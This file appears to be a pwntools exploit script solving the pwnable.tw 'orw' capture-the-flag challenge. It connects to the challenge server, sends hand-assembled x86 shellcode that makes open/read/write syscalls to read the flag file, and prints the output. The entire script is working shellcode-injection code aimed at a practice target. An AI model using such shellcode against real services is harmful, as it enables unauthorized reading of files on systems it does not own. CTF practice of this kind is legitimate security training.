#filename:exp.py
#author: reshahar

from pwn import *

#p = process('./orw')
p = remote('chall.pwnable.tw',10001)

sh =  asm('sub esp,100')    
sh += asm('xor ecx,ecx')
sh += asm('xor edx,edx')
sh += asm('xor eax,eax')
sh += asm('xor ebx,ebx')
sh += asm('push ecx')
sh += asm('push 0x67616c66')        #string '/home//orw//flag'
sh += asm('push 0x2f2f7772')
sh += asm('push 0x6f2f2f65')
sh += asm('push 0x6d6f682f')
sh += asm('mov ebx,esp')
sh += asm('mov al,5')
sh += asm('int 0x80')       #call open()
sh += asm('nop')
sh += asm('mov ebx,eax')
sh += asm('mov ecx,esp')
sh += asm('mov edx,60')
sh += asm('mov eax,3')
sh += asm('int 0x80')       #call read()
sh += asm('nop')
sh += asm('mov ebx,1')
sh += asm('mov edx,60')
sh += asm('mov eax,4')
sh += asm('int 0x80')       #call write()
sh += asm('nop')
sh += asm('add esp,120')    #stack balance 
sh += asm('ret')

p.send(sh)

# f = open ('1','wb')
# f.write(sh)

p.recvuntil('Give my your shellcode:')

print p.recv(60)